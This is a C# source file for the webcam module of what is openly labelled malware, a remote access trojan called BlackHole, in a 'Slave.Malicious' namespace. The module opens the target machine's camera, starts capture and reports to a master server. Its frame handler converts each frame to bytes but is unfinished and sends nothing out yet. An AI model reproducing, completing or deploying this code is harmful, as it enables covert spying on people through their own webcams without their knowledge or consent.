using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Runtime.InteropServices;
using System.Threading;
using System.Threading.Tasks;
using AForge.Video.DirectShow;
using BlackHole.Common;
using BlackHole.Common.Network.Protocol;

namespace BlackHole.Slave.Malicious
{
    public class Webcam : Singleton<Webcam>, IMalicious
    {
        private VideoCapabilities[] VideoCapabilities => _videoDevice?.VideoCapabilities;
        private VideoCaptureDevice _videoDevice;
        private FilterInfoCollection _videoDevices;

        public void Initialize()
        {
            _videoDevices = new FilterInfoCollection(FilterCategory.VideoInputDevice);
            //foreach (FilterInfo device in _videoDevices)
            //devicesCombo.Items.Add(device.Name);
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="message"></param>
        public void StartScreenCapture(StartScreenCaptureMessage message)
        {
            MasterServer.Instance.SendStatus(message.WindowId, "Webcam capture", "Started capturing webcam...");

            _videoDevice = new VideoCaptureDevice(_videoDevices[0].MonikerString);
            _videoDevice.NewFrame += _videoDevice_NewFrame;

            _videoDevice.VideoResolution = VideoCapabilities[0];
            _videoDevice.Start();

            /////////////////////////

            //foreach (var capabilty in VideoCapabilities)
            //videoResolutionsCombo.Items.Add($"{capabilty.FrameSize.Width} x {capabilty.FrameSize.Height}");

            //if (VideoCapabilities.Length == 0)
            //videoResolutionsCombo.Items.Add("Not supported");

        }

        public byte[] BitmapToByteArray(Bitmap bitmap)
        {
            BitmapData bmpdata = bitmap.LockBits(new Rectangle(0, 0, bitmap.Width, bitmap.Height),
                ImageLockMode.ReadOnly, bitmap.PixelFormat);

            byte[] bytedata = new byte[bmpdata.Stride * bitmap.Height];
            Marshal.Copy(bmpdata.Scan0, bytedata, 0, bytedata.Length);
            return bytedata;
        }

        private void _videoDevice_NewFrame(object sender, AForge.Video.NewFrameEventArgs eventArgs)
        {
            var bitmapArray = BitmapToByteArray(eventArgs.Frame);

            string s = "";
        }
    }
}